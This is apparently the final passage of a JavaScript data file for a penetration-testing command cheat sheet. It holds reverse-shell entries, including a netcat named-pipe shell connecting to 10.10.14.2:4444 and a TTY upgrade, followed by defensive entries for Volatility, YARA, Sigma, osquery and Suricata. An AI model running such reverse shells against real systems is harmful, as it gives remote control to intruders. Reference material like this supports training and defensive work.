    example: "attacker$ nc -lvnp 4444\nConnection received on 10.10.10.5\nPS C:\\inetpub\\wwwroot>"
  },
  {
    category: "Reverse Shell",
    tool: "nc",
    command: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.2 4444 > /tmp/f",
    os: "Linux",
    description: "Netcat reverse shell using named pipe (FIFO). Works when nc doesn't have -e flag (OpenBSD variant). Creates a bidirectional pipe.",
    mitre: "T1059.004 — Command and Scripting Interpreter: Unix Shell",
    example: "attacker$ nc -lvnp 4444\nConnection received on 10.10.10.5\nwww-data@victim:~$"
  },
  {
    category: "Reverse Shell",
    tool: "python",
    command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm",
    os: "Linux",
    description: "Shell upgrade — convert dumb reverse shell to fully interactive TTY. Enables tab completion, Ctrl+C handling, clear screen, and vi/nano editing.",
    mitre: "T1059.006 — Command and Scripting Interpreter: Python",
    example: "www-data@victim:~$ (full interactive shell with tab completion)"
  },

  // ============================================================
  // FORENSICS & DEFENSE
  // ============================================================
  {
    category: "Defense & Forensics",
    tool: "volatility",
    command: "vol.py -f memory.dmp windows.info && vol.py -f memory.dmp windows.pslist && vol.py -f memory.dmp windows.netscan && vol.py -f memory.dmp windows.hashdump",
    os: "Linux/macOS",
    description: "Memory forensics with Volatility 3. Analyze RAM dump: system info, running processes, network connections, and password hashes from memory.",
    mitre: "Defense — Incident Response",
    example: "PID  PPID  ImageFileName    CreateTime\n4    0     System           2024-01-01 00:00:00\n604  4     smss.exe         2024-01-01 00:00:01\n9999 1234  suspicious.exe   2024-01-15 14:23:45"
  },
  {
    category: "Defense & Forensics",
    tool: "yara",
    command: "yara -r /opt/yara-rules/malware/ /path/to/suspicious/files/",
    os: "Linux/macOS",
    description: "YARA malware scanning — match files against pattern-based rules. Identifies malware families, packers, exploits, and suspicious characteristics.",
    mitre: "Defense — Malware Analysis",
    example: "Emotet_Banking_Trojan /path/to/suspicious/file.exe\nCobaltStrike_Beacon /path/to/dll_loader.dll"
  },
  {
    category: "Defense & Forensics",
    tool: "sigma",
    command: "sigma convert -t splunk -p sysmon rules/windows/process_creation/proc_creation_win_susp_powershell.yml",
    os: "Linux",
    description: "Convert Sigma detection rules to SIEM-specific queries (Splunk, Elastic, Sentinel, QRadar). Universal format for sharing detection logic.",
    mitre: "Defense — Detection Engineering",
    example: "index=windows source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 \n| where match(CommandLine, \"(?i)(Invoke-Mimikatz|Invoke-Expression|IEX|downloadstring)\")"
  },
  {
    category: "Defense & Forensics",
    tool: "osquery",
    command: "osqueryi --json 'SELECT pid, name, path, cmdline, uid FROM processes WHERE on_disk = 0 OR path LIKE \"%/tmp/%\" OR path LIKE \"%/dev/shm/%\"'",
    os: "Linux/macOS/Windows",
    description: "Query endpoint state like a database. Find fileless malware (not on disk), processes running from temp directories, or suspicious process characteristics.",
    mitre: "Defense — Endpoint Detection",
    example: "[{\"pid\":\"1234\",\"name\":\"bash\",\"path\":\"\",\"cmdline\":\"bash -i\",\"uid\":\"33\"}]"
  },
  {
    category: "Defense & Forensics",
    tool: "suricata",
    command: "suricata -c /etc/suricata/suricata.yaml -i eth0 -S /etc/suricata/rules/custom.rules -l /var/log/suricata/",
    os: "Linux",
    description: "Run Suricata IDS/IPS with custom rules on network interface. Monitors traffic in real-time for known attack signatures and anomalies.",
    mitre: "Defense — Network Monitoring",
    example: "[**] [1:2024000:1] ET TROJAN Cobalt Strike Beacon Detected [**]\n[Classification: Malware Command and Control] [Priority: 1]\n{TCP} 10.10.10.50:443 -> 10.10.14.2:4444"
  }
];

// Total: 93 commands across 12 categories
// Categories: Reconnaissance, Scanning, Exploitation, Privilege Escalation, Lateral Movement,
//   Persistence, Post-Exploitation, Exfiltration, Wireless, Active Directory, Web Application,
//   Network, Cloud & Container, Reverse Shell, Defense & Forensics
